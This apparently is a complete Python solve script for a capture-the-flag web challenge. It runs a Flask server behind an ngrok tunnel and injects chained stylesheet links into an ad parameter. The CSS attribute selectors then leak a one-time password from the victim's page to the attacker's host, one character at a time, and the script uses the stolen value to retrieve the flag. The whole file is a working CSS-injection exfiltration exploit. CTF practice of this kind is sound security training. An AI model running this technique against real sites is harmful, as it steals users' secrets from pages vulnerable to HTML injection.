from flask import Flask, Response
import string
from threading import Condition, Thread
import requests
from pyngrok import ngrok

# CHAL_URL = 'https://adversal-tlejfksioa-ul.a.run.app'
CHAL_URL = 'https://adversal-revenge-tlejfksioa-ul.a.run.app'

PORT = 8500

tunnel = ngrok.connect(PORT, 'http', bind_tls=True)

# ----- FLASK SEVER START -----
app = Flask(__name__)

ENDPOINT = tunnel.public_url
NUM_CHARS = 12

cv = Condition()

class State:
    stage = 0
    data = ''

def generate_payload():
    return ''.join([f'<link+rel="stylesheet"+href="{ENDPOINT}/style/{i}">' for i in range(NUM_CHARS + 1)])

def make_style_line(c):
    data = State.data
    return (
        f'input[type="text"][value^="{data + c}"] {{ background-image: url("{ENDPOINT}/capture/{data + c}"); }}'
    )

def make_stylesheet():
    charset = string.ascii_letters + string.digits
    return '\r\n'.join(map(make_style_line, charset))
 
@app.route('/style/<stage>')
def style(stage):
    with cv:
        cv.wait_for(lambda: State.stage == int(stage))

    return Response(make_stylesheet(), mimetype='text/css')

@app.route('/capture/<data>')
def capture(data):
    State.data = data
    State.stage += 1

    with cv:
        cv.notify_all()

    return ''
# ----- FLASK SEVER END -----
 
if __name__ == '__main__':
    payload = generate_payload()

    thread = Thread(target=lambda: app.run(port=PORT, debug=True, use_reloader=False))
    thread.daemon = True
    thread.start()

    session = requests.Session()
    session.get(f'{CHAL_URL}/visit?ad={payload}')
    res = session.get(f'{CHAL_URL}/flag?otp={State.data}')

    if 'wctf{' in res.text:
        print(res.text)
        exit(0)
    else:
        exit(1)